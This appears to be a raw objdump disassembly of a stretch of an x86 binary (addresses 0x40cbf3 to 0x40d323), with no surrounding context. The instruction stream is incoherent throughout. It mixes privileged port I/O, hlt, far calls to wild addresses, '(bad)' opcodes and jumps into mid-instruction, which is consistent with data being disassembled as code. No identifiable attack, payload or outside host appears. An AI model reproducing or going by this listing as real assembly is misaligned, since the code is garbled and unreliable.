  40cbf3:	pop    ebp
  40cbf4:	shl    DWORD PTR [ebx],1
  40cbf6:	sub    DWORD PTR [esp+esi*1+0x2e8b7dfe],edx
  40cbfd:	aad    0xd3
  40cbff:	sub    al,0xa1
  40cc01:	jno    0x40cc51
  40cc03:	je     0x40cc69
  40cc05:	les    esi,FWORD PTR [ebx+0x35468845]
  40cc0b:	mov    bl,0xff
  40cc0d:	out    0x67,al
  40cc0f:	jno    0x40cbef
  40cc11:	inc    ecx
  40cc12:	ret    
  40cc13:	mov    esi,0x95b3bc35
  40cc18:	daa    
  40cc19:	nop
  40cc1a:	mov    bh,0x41
  40cc1c:	lds    edx,FWORD PTR [edi]
  40cc1e:	retf   0x602f
  40cc21:	xchg   BYTE PTR [eax+eiz*1],bl
  40cc24:	cmp    esp,ebx
  40cc26:	xchg   esi,eax
  40cc27:	sahf   
  40cc28:	mov    edx,0x8deaad86
  40cc2d:	xchg   edi,eax
  40cc2e:	loopne 0x40cc5f
  40cc30:	pop    es
  40cc31:	dec    ecx
  40cc32:	je     0x40cc32
  40cc34:	xor    edi,DWORD PTR [edx+edi*8]
  40cc37:	mov    esp,0xf105540
  40cc3c:	adc    edx,DWORD PTR [edx-0x482910d]
  40cc42:	inc    ebp
  40cc43:	lods   al,BYTE PTR ds:[esi]
  40cc44:	mov    esi,0x1e1d88e6
  40cc49:	imul   ebp,esp,0xffffffb3
  40cc4c:	cmp    edi,eax
  40cc4e:	sub    ecx,DWORD PTR [ecx]
  40cc50:	std    
  40cc51:	retf   
  40cc52:	bound  edx,QWORD PTR [edi+eax*4]
  40cc55:	adc    eax,0x26373c82
  40cc5a:	pushf  
  40cc5b:	jle    0x40ccab
  40cc5d:	fimul  WORD PTR ds:0xdd2bb326
  40cc63:	and    ah,BYTE PTR [eax-0x63]
  40cc66:	cmc    
  40cc67:	mov    dh,0xde
  40cc69:	pop    ebx
  40cc6a:	push   edx
  40cc6b:	jb     0x40cc9a
  40cc6d:	push   ecx
  40cc6e:	push   es
  40cc6f:	mov    esp,0x1a9219a3
  40cc74:	rol    bh,0xfe
  40cc77:	shl    BYTE PTR [esi+eiz*2],cl
  40cc7a:	pop    es
  40cc7b:	push   ebx
  40cc7c:	shl    bl,0x0
  40cc7f:	scas   al,BYTE PTR es:[edi]
  40cc80:	inc    DWORD PTR [edi+edx*1]
  40cc83:	loop   0x40ccf3
  40cc85:	aad    0xfa
  40cc87:	lds    eax,FWORD PTR [edi]
  40cc89:	in     eax,dx
  40cc8a:	sub    ecx,esp
  40cc8c:	xor    BYTE PTR [edx-0x4e18a7f1],ch
  40cc92:	das    
  40cc93:	daa    
  40cc94:	push   eax
  40cc95:	sbb    BYTE PTR [ebp+0x2c],0x9a
  40cc99:	(bad)  
  40cc9a:	adc    DWORD PTR [edx-0x6b],ebp
  40cc9d:	sahf   
  40cc9e:	push   esi
  40cc9f:	push   ecx
  40cca0:	jmp    DWORD PTR ds:0xaf33da8f
  40cca6:	and    edi,ecx
  40cca8:	pop    ecx
  40cca9:	repnz hlt 
  40ccab:	pop    edx
  40ccac:	jae    0x40cc3b
  40ccae:	(bad)  [ebp+0x4e26f2c4]
  40ccb4:	and    eax,0xdfefe628
  40ccb9:	cs aad 0x7c
  40ccbc:	fadd   DWORD PTR [edi]
  40ccbe:	jnp    0x40ccd2
  40ccc0:	shr    DWORD PTR [ebx],0x5a
  40ccc3:	sbb    BYTE PTR [esi+0x4e],ah
  40ccc6:	xor    eax,0x874230b3
  40cccb:	cmp    bh,cl
  40cccd:	mov    eax,0xf8ed8aac
  40ccd2:	mov    al,0x40
  40ccd4:	inc    ecx
  40ccd5:	in     eax,0xda
  40ccd7:	adc    eax,0x87ccc0a3
  40ccdc:	(bad)  
  40ccdd:	mov    ds:0x2a524172,al
  40cce2:	dec    edx
  40cce3:	inc    ecx
  40cce4:	fst    st(2)
  40cce6:	test   DWORD PTR [esi+0x15],edx
  40cce9:	xor    edi,DWORD PTR [ebx+edx*1]
  40ccec:	push   ebx
  40cced:	mov    cl,0x3
  40ccef:	out    dx,eax
  40ccf0:	xor    DWORD PTR gs:[edx],0x4677c984
  40ccf7:	sub    al,0x21
  40ccf9:	pop    esp
  40ccfa:	jmp    0x53af88a3
  40ccff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd00:	jo     0x40ccdb
  40cd02:	call   esi
  40cd04:	je     0x40cc9d
  40cd06:	out    dx,eax
  40cd07:	and    al,0xe8
  40cd09:	push   cs
  40cd0a:	in     eax,0xbe
  40cd0c:	xor    DWORD PTR [esi-0x20701958],esp
  40cd12:	test   eax,ebx
  40cd14:	sbb    eax,edi
  40cd16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd17:	and    ecx,DWORD PTR [edx]
  40cd19:	adc    DWORD PTR [esi-0x1d],esp
  40cd1c:	and    BYTE PTR [ebp-0x14],cl
  40cd1f:	push   es
  40cd20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd21:	pop    ss
  40cd22:	mov    esp,0xe1554fbb
  40cd27:	and    BYTE PTR [esi*1+0x30bed85a],bh
  40cd2e:	xchg   BYTE PTR [edx],dl
  40cd30:	ror    BYTE PTR [eax+0x7b],0xcb
  40cd34:	push   ecx
  40cd35:	add    esi,DWORD PTR [edi-0x16c456b4]
  40cd3b:	adc    BYTE PTR [edi],bl
  40cd3d:	ret    0xf13b
  40cd40:	in     eax,0xc3
  40cd42:	jge    0x40cd0b
  40cd44:	in     eax,0x36
  40cd46:	jnp    0x40cd71
  40cd48:	mov    ds:0xc79c01f0,eax
  40cd4d:	sbb    BYTE PTR [esi+eiz*8+0x2e656cce],dh
  40cd54:	mov    ah,0xc7
  40cd56:	ds ins BYTE PTR es:[edi],dx
  40cd58:	hlt    
  40cd59:	(bad)  
  40cd5b:	pop    es
  40cd5c:	ins    BYTE PTR es:[edi],dx
  40cd5d:	mov    ch,0x2
  40cd5f:	pop    ss
  40cd60:	imul   ebp,DWORD PTR [ebx-0x72],0x5c
  40cd64:	or     dl,BYTE PTR [ecx]
  40cd66:	inc    edx
  40cd67:	pop    eax
  40cd68:	sub    eax,0x4b5e8fde
  40cd6d:	mov    ds:0x8a0ee7f8,al
  40cd72:	sar    ah,1
  40cd74:	xor    eax,0xcaa715f6
  40cd79:	call   0xce73:0x11fbfff9
  40cd80:	ret    
  40cd81:	icebp  
  40cd82:	sar    DWORD PTR [edi+0x7f],0x62
  40cd86:	xor    esp,DWORD PTR [ebp+0x20b30982]
  40cd8c:	xchg   ebp,eax
  40cd8d:	(bad)  
  40cd8e:	fimul  DWORD PTR [ecx-0x77f155b6]
  40cd94:	sbb    ebp,DWORD PTR [esi]
  40cd96:	push   ss
  40cd97:	add    DWORD PTR [esi],0x45940a6c
  40cd9d:	jnp    0x40cdce
  40cd9f:	ret    0x7f5c
  40cda2:	call   0x995d1c52
  40cda7:	mov    al,0xbc
  40cda9:	jno    0x40cdd3
  40cdab:	mov    dh,0xfd
  40cdad:	outs   dx,BYTE PTR ds:[esi]
  40cdae:	jbe    0x40ce0b
  40cdb0:	pop    ebx
  40cdb1:	inc    esp
  40cdb2:	xor    BYTE PTR [esi-0x1a],dl
  40cdb5:	out    dx,al
  40cdb6:	test   ch,bl
  40cdb8:	jmp    0x40ce1f
  40cdba:	out    0x80,eax
  40cdbc:	push   ds
  40cdbd:	icebp  
  40cdbe:	and    ah,BYTE PTR [ecx-0xe79e20a]
  40cdc4:	into   
  40cdc5:	sub    ah,cl
  40cdc7:	sahf   
  40cdc8:	jne    0x40cdc1
  40cdca:	popf   
  40cdcb:	fcmove st,st(4)
  40cdcd:	out    0x2a,eax
  40cdcf:	cmp    eax,0x297f7eca
  40cdd4:	lods   al,BYTE PTR ds:[esi]
  40cdd5:	inc    ecx
  40cdd6:	mov    eax,ds:0xe73ae718
  40cddb:	je     0x40ce1c
  40cddd:	and    edx,DWORD PTR [edx+0x3c]
  40cde0:	in     eax,0xe1
  40cde2:	call   0x17be:0x5c2ccab2
  40cde9:	hlt    
  40cdea:	outs   dx,BYTE PTR ds:[esi]
  40cdeb:	ss or  edx,0x347497e6
  40cdf2:	inc    eax
  40cdf3:	pop    ds
  40cdf4:	sbb    esi,DWORD PTR [eax]
  40cdf6:	call   0x49128c34
  40cdfb:	xlat   BYTE PTR ds:[ebx]
  40cdfc:	xor    BYTE PTR [edi],0xf4
  40cdff:	imul   edx,DWORD PTR [edi],0xffffff91
  40ce02:	arpl   WORD PTR [ebp-0x35],bp
  40ce05:	sbb    esi,ecx
  40ce07:	(bad)  
  40ce08:	cmc    
  40ce09:	or     al,0x43
  40ce0b:	xor    eax,0xe93b5635
  40ce10:	or     bl,BYTE PTR [ecx+0x4b]
  40ce13:	in     al,dx
  40ce14:	lods   al,BYTE PTR ds:[esi]
  40ce15:	inc    esp
  40ce16:	ja     0x40ce31
  40ce18:	ins    DWORD PTR es:[edi],dx
  40ce19:	test   BYTE PTR ds:0x484daf40,cl
  40ce1f:	sbb    al,0x60
  40ce21:	xchg   ecx,eax
  40ce22:	jl     0x40ce3d
  40ce24:	adc    al,0xe9
  40ce26:	ret    
  40ce27:	(bad)  
  40ce28:	mov    ds:0x1c792bd6,al
  40ce2d:	sub    esp,esi
  40ce2f:	out    0xcb,al
  40ce31:	xchg   edx,eax
  40ce32:	or     dh,ah
  40ce34:	in     eax,dx
  40ce35:	xchg   edi,eax
  40ce36:	xor    eax,0x1aa7d04d
  40ce3b:	cli    
  40ce3c:	jmp    0x7be7ca01
  40ce41:	retf   
  40ce42:	and    dl,bl
  40ce44:	fcom   QWORD PTR [ecx]
  40ce46:	xlat   BYTE PTR ds:[ebx]
  40ce47:	imul   edi,DWORD PTR [ecx+0x5adf9177],0xfffffff3
  40ce4e:	rol    edi,cl
  40ce50:	ins    DWORD PTR es:[edi],dx
  40ce51:	push   edx
  40ce52:	leave  
  40ce53:	jg     0x40ce56
  40ce55:	stc    
  40ce56:	sbb    DWORD PTR [edi-0x78],ebp
  40ce59:	js     0x40cde5
  40ce5b:	lds    esp,FWORD PTR [ebx-0x5847ad83]
  40ce61:	(bad)  
  40ce62:	stos   DWORD PTR es:[edi],eax
  40ce63:	xor    DWORD PTR [ebp-0x48528a00],0xffffff90
  40ce6a:	ret    0x6fea
  40ce6d:	outs   dx,BYTE PTR ds:[esi]
  40ce6e:	aam    0xea
  40ce70:	int    0xd2
  40ce72:	sahf   
  40ce73:	rol    DWORD PTR [ebx],1
  40ce75:	dec    ebx
  40ce76:	loop   0x40cdf9
  40ce78:	xchg   BYTE PTR [ecx+0x52],cl
  40ce7b:	hlt    
  40ce7c:	dec    ebp
  40ce7d:	mov    ecx,DWORD PTR [esi+0x50]
  40ce80:	inc    edi
  40ce81:	adc    eax,0x47a579c2
  40ce86:	imul   edx,DWORD PTR [esi],0xc4f11ca3
  40ce8c:	xchg   esi,eax
  40ce8d:	pop    ds
  40ce8e:	dec    ecx
  40ce8f:	test   DWORD PTR [ebx+edx*2-0x2181cefd],0x76b4b129
  40ce9a:	das    
  40ce9b:	mov    ds:0x56f466e3,eax
  40cea0:	rcl    BYTE PTR [esi+edx*2-0x4bb09c5a],0x7c
  40cea8:	mov    esp,0x25297d34
  40cead:	push   0xa2db10ce
  40ceb2:	cmp    esp,DWORD PTR [eax-0x40a334a3]
  40ceb8:	pop    eax
  40ceb9:	xchg   DWORD PTR [edi+0x5c1686a],edi
  40cebf:	push   ss
  40cec0:	daa    
  40cec1:	mov    eax,DWORD PTR [eax+0x2b]
  40cec4:	nop
  40cec5:	dec    dl
  40cec7:	aaa    
  40cec8:	loop   0x40cf05
  40ceca:	jmp    0x6dbea2c6
  40cecf:	xor    eax,0xb36a7737
  40ced4:	std    
  40ced5:	push   es
  40ced6:	push   esi
  40ced7:	jbe    0x40cf32
  40ced9:	out    0xd4,eax
  40cedb:	jle    0x40cf0b
  40cedd:	jp     0x40ce75
  40cedf:	mov    bl,BYTE PTR [ebx+ebp*8+0x6ba72c0f]
  40cee6:	mov    ds,WORD PTR [edi+0x7e]
  40cee9:	xchg   ecx,eax
  40ceea:	sub    ch,BYTE PTR [edi-0x4a]
  40ceed:	push   0x388d5e12
  40cef2:	lds    edx,FWORD PTR [edx+0x174b99bf]
  40cef8:	out    dx,eax
  40cef9:	inc    ebx
  40cefa:	in     eax,dx
  40cefb:	js     0x40cf2f
  40cefd:	dec    edx
  40cefe:	imul   edi,DWORD PTR [eax],0x991437d8
  40cf04:	popf   
  40cf05:	push   es
  40cf06:	cwde   
  40cf07:	mov    ecx,0x8ddc4209
  40cf0c:	stos   DWORD PTR es:[edi],eax
  40cf0d:	in     al,0x92
  40cf0f:	data16 int 0x84
  40cf12:	out    dx,eax
  40cf13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf14:	cmc    
  40cf15:	mov    ebx,0xfc2aec29
  40cf1a:	in     al,dx
  40cf1b:	sbb    al,0x57
  40cf1d:	in     eax,dx
  40cf1e:	lock or eax,0xd94c9909
  40cf24:	mov    ecx,0xbcf290f4
  40cf29:	out    0xaa,al
  40cf2b:	sub    dl,BYTE PTR [esi-0xe44177]
  40cf31:	cmp    BYTE PTR [edx-0x3da8efc7],dl
  40cf37:	pop    esi
  40cf38:	xor    ecx,DWORD PTR [edi]
  40cf3a:	mov    es,esi
  40cf3c:	jmp    0x7bfa1ea5
  40cf41:	xlat   BYTE PTR ds:[ebx]
  40cf42:	pop    gs
  40cf44:	or     cl,dl
  40cf46:	inc    esi
  40cf47:	mov    eax,esp
  40cf49:	das    
  40cf4a:	push   ecx
  40cf4b:	jno    0x40cee7
  40cf4d:	test   bh,0xad
  40cf50:	lods   eax,DWORD PTR ds:[esi]
  40cf51:	mov    al,0xd6
  40cf53:	in     al,dx
  40cf54:	jae    0x40cef3
  40cf56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf57:	sbb    ah,dl
  40cf59:	xchg   ecx,eax
  40cf5a:	adc    DWORD PTR [esi+0x62ea5404],edx
  40cf60:	mov    dl,0xa
  40cf62:	push   ebp
  40cf63:	and    DWORD PTR [eax+0x58d94b3f],ebp
  40cf69:	loop   0x40cf64
  40cf6b:	(bad)  
  40cf6c:	dec    esi
  40cf6d:	sbb    eax,ebp
  40cf6f:	fld    TBYTE PTR [ebx+ebp*2]
  40cf72:	cwde   
  40cf73:	mov    ah,0x56
  40cf75:	push   0xce5fb675
  40cf7a:	jbe    0x40cfbd
  40cf7c:	mov    ah,0xca
  40cf7e:	sub    eax,0x523ac4f7
  40cf83:	mov    edi,0x777ad57d
  40cf88:	mov    edx,0xe1c72d0f
  40cf8d:	xor    eax,DWORD PTR [esi-0x48]
  40cf90:	xor    al,BYTE PTR [ecx]
  40cf92:	cmp    al,0xd0
  40cf94:	cs daa 
  40cf96:	dec    ebp
  40cf97:	fsubr  DWORD PTR [edx+0x66bd301e]
  40cf9d:	push   cs
  40cf9e:	xchg   BYTE PTR [esi-0x621cba20],bh
  40cfa4:	or     ecx,DWORD PTR [edi]
  40cfa6:	std    
  40cfa7:	jmp    0x40cfab
  40cfa9:	mov    edi,0xf4700027
  40cfae:	sar    eax,1
  40cfb0:	call   0xbd55b4a6
  40cfb5:	jg     0x40cf4c
  40cfb7:	and    eax,0x65aa237c
  40cfbc:	xchg   ecx,eax
  40cfbd:	push   ebx
  40cfbe:	dec    edi
  40cfbf:	mov    ds:0x3e78fbb4,al
  40cfc4:	cmc    
  40cfc5:	jp     0x40cfb5
  40cfc7:	xor    DWORD PTR [ecx+0x4e],ebp
  40cfca:	mov    ds:0xf7eb67c3,eax
  40cfcf:	(bad)  
  40cfd0:	lds    edi,FWORD PTR [ebx+0x44]
  40cfd3:	(bad)  
  40cfd4:	test   ebp,0xd360ff33
  40cfda:	das    
  40cfdb:	push   ebx
  40cfdc:	pop    edx
  40cfdd:	stc    
  40cfde:	dec    ebp
  40cfdf:	jae    0x40cfd0
  40cfe1:	or     DWORD PTR [edx],edi
  40cfe3:	stc    
  40cfe4:	es pop ebx
  40cfe6:	je     0x40cfff
  40cfe8:	ins    BYTE PTR es:[edi],dx
  40cfe9:	push   ebx
  40cfea:	hlt    
  40cfeb:	outs   dx,BYTE PTR ds:[esi]
  40cfec:	(bad)  
  40cfed:	ror    ch,1
  40cfef:	inc    ebx
  40cff0:	enter  0x3382,0x71
  40cff4:	rol    DWORD PTR [eax+0x56],cl
  40cff7:	mov    esp,0x64161a0a
  40cffc:	(bad)  
  40cffd:	mov    ecx,0x96923a0f
  40d002:	shl    BYTE PTR [ebx],0x77
  40d005:	enter  0x11ed,0x9f
  40d009:	call   0xde08:0x41fc557c
  40d010:	or     bh,al
  40d012:	sub    al,0x58
  40d014:	pop    ds
  40d015:	stos   BYTE PTR es:[edi],al
  40d016:	jnp    0x40cf9d
  40d018:	je     0x40d043
  40d01a:	sub    ebx,DWORD PTR [edi+0x5c]
  40d01d:	cwde   
  40d01e:	xor    cl,BYTE PTR [eax-0x4892bf8a]
  40d024:	pop    ebx
  40d025:	adc    eax,0x28c033b2
  40d02a:	imul   esp,DWORD PTR [eax],0xdae87411
  40d030:	jo     0x40d005
  40d032:	sub    DWORD PTR [edi+0x553b44b4],0xffffffcc
  40d039:	pop    ebp
  40d03a:	dec    edi
  40d03b:	dec    ecx
  40d03c:	push   eax
  40d03d:	out    dx,eax
  40d03e:	int3   
  40d03f:	clc    
  40d040:	ffree  st(2)
  40d042:	mov    bh,BYTE PTR [edx+eiz*1+0xe]
  40d046:	mov    bh,ah
  40d048:	push   cs
  40d049:	idiv   eax
  40d04b:	neg    BYTE PTR [edi+0x387be34e]
  40d051:	shl    ah,0xb7
  40d054:	xor    BYTE PTR [esi-0x6970d98b],0x1d
  40d05b:	clc    
  40d05c:	loope  0x40cfe3
  40d05e:	jge    0x40d0cb
  40d060:	(bad)  
  40d061:	clc    
  40d062:	js     0x40d01e
  40d064:	dec    edi
  40d065:	push   es
  40d066:	loope  0x40d067
  40d068:	add    eax,0xf9b783fe
  40d06d:	mov    eax,0x758f0748
  40d072:	enter  0x2514,0x96
  40d076:	scas   eax,DWORD PTR es:[edi]
  40d077:	fidiv  WORD PTR [ecx]
  40d079:	mov    ch,0xf3
  40d07b:	and    ecx,edi
  40d07d:	stos   BYTE PTR es:[edi],al
  40d07e:	and    WORD PTR [edi+0x7a],di
  40d082:	sub    bh,BYTE PTR [edx]
  40d084:	cmp    ah,BYTE PTR [edi+0x3e]
  40d087:	push   edi
  40d088:	mov    ah,0x9f
  40d08a:	mov    al,0x1e
  40d08c:	outs   dx,BYTE PTR ds:[esi]
  40d08d:	pusha  
  40d08e:	rol    BYTE PTR [esi+0x1a],1
  40d091:	cli    
  40d092:	push   cs
  40d093:	int    0xaf
  40d095:	xchg   bl,bh
  40d097:	sar    DWORD PTR [edi],1
  40d099:	push   ecx
  40d09a:	cli    
  40d09b:	push   ebx
  40d09c:	repz (bad) 
  40d09e:	in     al,dx
  40d09f:	mov    eax,ds:0x89d89660
  40d0a4:	jae    0x40d114
  40d0a6:	retf   0x6e11
  40d0a9:	(bad)  
  40d0aa:	mov    al,ds:0xc8a86341
  40d0af:	or     BYTE PTR [ecx],dh
  40d0b1:	mov    ds:0x1d87d408,al
  40d0b6:	sar    DWORD PTR [ebx],0xf6
  40d0b9:	lahf   
  40d0ba:	inc    edx
  40d0bb:	inc    edi
  40d0bc:	int3   
  40d0bd:	ss stos DWORD PTR es:[edi],eax
  40d0bf:	mov    eax,ds:0x23f4ef38
  40d0c4:	pop    ds
  40d0c5:	push   ebx
  40d0c6:	push   eax
  40d0c7:	adc    al,0x7f
  40d0c9:	sub    eax,eax
  40d0cb:	lods   eax,DWORD PTR ds:[esi]
  40d0cc:	or     BYTE PTR [edx+0x71bfea4c],ch
  40d0d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0d3:	(bad)  
  40d0d4:	sub    al,BYTE PTR [edi]
  40d0d6:	push   ecx
  40d0d7:	add    edx,DWORD PTR [edi+0x72]
  40d0da:	inc    edi
  40d0db:	add    eax,0xb63e333e
  40d0e0:	push   ecx
  40d0e1:	(bad)  
  40d0e2:	aad    0xa4
  40d0e4:	popf   
  40d0e5:	or     eax,0x416a2328
  40d0ea:	fwait
  40d0eb:	in     eax,0x49
  40d0ed:	pop    ss
  40d0ee:	xchg   esi,eax
  40d0ef:	dec    eax
  40d0f0:	mov    al,ds:0x3a2e0c33
  40d0f5:	mov    ebp,0x64def675
  40d0fa:	sbb    BYTE PTR [eax+0x12b61930],0xe8
  40d101:	imul   eax,edi,0x60
  40d104:	or     DWORD PTR [eax-0x1f],0xffffffbc
  40d108:	imul   ecx,edx,0xa710a215
  40d10e:	jp     0x40d158
  40d110:	dec    ecx
  40d111:	jg     0x40d0cb
  40d113:	pop    ecx
  40d114:	jle    0x40d0e7
  40d116:	dec    esp
  40d117:	(bad)  
  40d118:	and    al,0x22
  40d11a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d11b:	std    
  40d11c:	cmp    al,0x96
  40d11e:	cwde   
  40d11f:	aad    0x9b
  40d121:	test   al,0xd4
  40d123:	shr    DWORD PTR [esi],cl
  40d125:	fsub   QWORD PTR [ebp-0x7]
  40d128:	push   esi
  40d129:	imul   eax,DWORD PTR [eax],0x3c
  40d12c:	inc    eax
  40d12d:	loopne 0x40d192
  40d12f:	lods   eax,DWORD PTR ds:[esi]
  40d130:	push   ebp
  40d131:	cmp    eax,DWORD PTR [ecx+0x5e]
  40d134:	fidivr DWORD PTR [edx]
  40d136:	aas    
  40d137:	adc    al,0x9f
  40d139:	imul   eax,DWORD PTR [ecx],0x65
  40d13c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d13d:	das    
  40d13e:	neg    BYTE PTR [edx-0x1d63be2d]
  40d144:	adc    DWORD PTR [edi+0xb],esi
  40d147:	jecxz  0x40d111
  40d149:	push   0x51
  40d14b:	inc    eax
  40d14c:	fdiv   DWORD PTR [ecx-0xb]
  40d14f:	repz cmp DWORD PTR [ecx+0x67],edx
  40d153:	aaa    
  40d154:	sbb    edi,DWORD PTR [edx-0x39]
  40d157:	retf   
  40d158:	push   ecx
  40d159:	xor    dh,0x2e
  40d15c:	mov    ds:0xcb2aad60,eax
  40d161:	daa    
  40d162:	mov    dl,0xad
  40d164:	stos   DWORD PTR es:[edi],eax
  40d165:	push   edi
  40d166:	inc    ecx
  40d167:	push   eax
  40d168:	fmul   DWORD PTR [esi]
  40d16a:	pop    ecx
  40d16b:	ror    DWORD PTR [eax+0x313bce7b],1
  40d171:	mov    edx,0x9124e4a0
  40d176:	icebp  
  40d177:	add    BYTE PTR [esi],cl
  40d179:	sbb    bh,bh
  40d17b:	add    al,0xf8
  40d17d:	sbb    edi,DWORD PTR [ecx+0x1f4ff2f8]
  40d183:	lahf   
  40d184:	(bad)  
  40d185:	out    0x3e,eax
  40d187:	js     0x40d1fa
  40d189:	adc    DWORD PTR [esi-0x22],eax
  40d18c:	mov    dl,0x67
  40d18e:	in     al,dx
  40d18f:	mov    ch,0x78
  40d191:	mov    ebp,0x3f164eae
  40d196:	je     0x40d155
  40d198:	jne    0x40d15a
  40d19a:	cwde   
  40d19b:	and    al,ah
  40d19d:	retf   0x127a
  40d1a0:	add    eax,0xec3d3f3
  40d1a5:	mov    dh,0xd3
  40d1a7:	lods   al,BYTE PTR ds:[esi]
  40d1a8:	and    BYTE PTR [edi],cl
  40d1aa:	retf   
  40d1ab:	sub    esi,esi
  40d1ad:	pop    edi
  40d1ae:	sbb    eax,0xe083d70c
  40d1b3:	test   BYTE PTR [ebp+0xa],bl
  40d1b6:	mov    eax,ds:0x32af0d44
  40d1bc:	mov    al,ds:0xbf397be1
  40d1c1:	add    DWORD PTR [ebx],edi
  40d1c3:	mov    DWORD PTR [ecx-0x7f93ef2],edi
  40d1c9:	std    
  40d1ca:	mov    eax,0xae610774
  40d1cf:	sub    ebp,edx
  40d1d1:	cld    
  40d1d2:	and    ch,0x79
  40d1d5:	adc    BYTE PTR [ebx+edi*2-0x54],0x85
  40d1da:	push   ebp
  40d1db:	inc    edx
  40d1dc:	arpl   WORD PTR [edi+0x2f677cbe],cx
  40d1e2:	push   0x7ab9c7d3
  40d1e7:	mov    dh,0x5f
  40d1e9:	and    al,0x89
  40d1eb:	adc    al,BYTE PTR [ecx]
  40d1ed:	mov    bh,0xb6
  40d1ef:	cdq    
  40d1f0:	mov    edi,0xa20d3248
  40d1f5:	sbb    bh,BYTE PTR [edx-0x5f]
  40d1f8:	fidivr WORD PTR [ebx-0x41cdcac6]
  40d1fe:	aaa    
  40d1ff:	ss (bad) 
  40d201:	mov    ebx,0xac3e9ca2
  40d206:	adc    dl,BYTE PTR [ecx]
  40d208:	test   eax,0x64ed23c1
  40d20d:	push   es
  40d20e:	xlat   BYTE PTR ds:[ebx]
  40d20f:	jns    0x40d1e6
  40d211:	cmp    edx,DWORD PTR [ecx+0x5e368ad]
  40d217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d218:	jge    0x40d279
  40d21a:	pushf  
  40d21b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d21c:	dec    ecx
  40d21d:	jmp    0x40d1d7
  40d21f:	and    BYTE PTR [eax+0x22333cb6],ch
  40d225:	inc    edi
  40d226:	xchg   ebx,eax
  40d227:	cmp    al,BYTE PTR [esi+edi*4-0x33]
  40d22b:	jno    0x40d254
  40d22d:	ins    DWORD PTR es:[edi],dx
  40d22e:	pop    ss
  40d22f:	scas   al,BYTE PTR es:[edi]
  40d230:	repnz dec eax
  40d232:	pop    ss
  40d233:	jmp    FWORD PTR [ebp+0x12]
  40d236:	jge    0x40d2ad
  40d238:	sbb    ecx,DWORD PTR [edx+eiz*1]
  40d23b:	jbe    0x40d1e3
  40d23d:	pop    ss
  40d23e:	mov    esi,0x176b1e92
  40d243:	mov    bh,0x8d
  40d245:	xor    dh,BYTE PTR [esi+eiz*8-0xb]
  40d249:	outs   dx,BYTE PTR ds:[esi]
  40d24a:	pop    eax
  40d24b:	scas   eax,DWORD PTR es:[edi]
  40d24c:	xchg   BYTE PTR cs:[ebp-0x65],cl
  40d250:	stc    
  40d251:	fcomip st,st(2)
  40d253:	push   edx
  40d254:	popa   
  40d255:	sar    DWORD PTR [esi],1
  40d257:	xor    al,0x52
  40d259:	mov    ch,0x92
  40d25b:	add    esi,DWORD PTR [eax]
  40d25d:	in     al,0xe3
  40d25f:	adc    dh,BYTE PTR [ebp-0x3779d8d3]
  40d265:	das    
  40d266:	push   edi
  40d267:	dec    eax
  40d268:	xchg   edx,eax
  40d269:	pushf  
  40d26a:	mov    ds:0x822c4243,al
  40d26f:	repnz dec esp
  40d271:	pop    edx
  40d272:	push   edi
  40d273:	iret   
  40d274:	pusha  
  40d275:	in     eax,dx
  40d276:	pop    edi
  40d277:	mov    cl,0x91
  40d279:	jl     0x40d29c
  40d27b:	in     al,0x8e
  40d27d:	das    
  40d27e:	cmp    DWORD PTR [ecx-0x22e1e182],ebp
  40d284:	(bad)  
  40d285:	bound  edx,QWORD PTR [esi+0x2c1cc186]
  40d28b:	mov    ds:0xd86aa7ae,al
  40d290:	repz clc 
  40d292:	and    BYTE PTR [edx],bl
  40d294:	add    al,0x19
  40d296:	fwait
  40d297:	cli    
  40d298:	mov    bl,0x1d
  40d29a:	pop    esi
  40d29b:	sbb    ah,al
  40d29d:	adc    al,0xd2
  40d29f:	dec    ebx
  40d2a0:	cmc    
  40d2a1:	inc    edi
  40d2a2:	sub    DWORD PTR [esi+0x62],eax
  40d2a5:	int3   
  40d2a6:	dec    ebp
  40d2a7:	ror    BYTE PTR [ecx],cl
  40d2a9:	pop    ebp
  40d2aa:	cmp    ecx,DWORD PTR [esp]
  40d2ad:	xor    BYTE PTR [ebp+ebx*8-0x65],ah
  40d2b1:	lods   al,BYTE PTR ds:[esi]
  40d2b2:	add    al,0x52
  40d2b4:	cmp    DWORD PTR [eax],edi
  40d2b6:	add    dl,bl
  40d2b8:	lds    ebp,FWORD PTR [ebp+0x14]
  40d2bb:	les    edi,FWORD PTR [ecx+ebp*8-0x60]
  40d2bf:	aad    0x5f
  40d2c1:	push   ds
  40d2c2:	dec    ecx
  40d2c3:	lahf   
  40d2c4:	inc    eax
  40d2c5:	js     0x40d2eb
  40d2c7:	outs   dx,DWORD PTR ds:[esi]
  40d2c8:	retf   0xa7e
  40d2cb:	fs pop eax
  40d2cd:	dec    edx
  40d2ce:	cmp    BYTE PTR [eax+0x53436278],cl
  40d2d4:	std    
  40d2d5:	fadd   st,st(6)
  40d2d7:	xchg   edi,eax
  40d2d8:	adc    ebx,DWORD PTR [esi+0x7f94fff0]
  40d2de:	enter  0x4abb,0x55
  40d2e2:	pusha  
  40d2e3:	mov    al,ds:0x290aa218
  40d2e8:	pop    edi
  40d2e9:	or     esp,0x154883
  40d2ef:	mov    ebx,0xa34087eb
  40d2f4:	pmaxsw mm2,mm5
  40d2f7:	pop    ebp
  40d2f8:	mov    ds:0x81c4fef1,al
  40d2fd:	xchg   edx,eax
  40d2fe:	push   edx
  40d2ff:	enter  0x1aec,0xd5
  40d303:	xchg   DWORD PTR [edx-0x5d],ebx
  40d306:	(bad)  
  40d308:	inc    eax
  40d309:	and    esi,DWORD PTR [ecx-0x24]
  40d30c:	je     0x40d34b
  40d30e:	pop    ebp
  40d30f:	inc    eax
  40d310:	mov    esp,DWORD PTR [ebp+0x30b5793d]
  40d316:	inc    esp
  40d317:	inc    ebp
  40d318:	test   DWORD PTR [ebp-0x1d],ebx
  40d31b:	pop    ebp
  40d31c:	and    BYTE PTR [ebx+0x498a3fdb],0x88
  40d323:	xchg   BYTE PTR [edx-0x3],dh
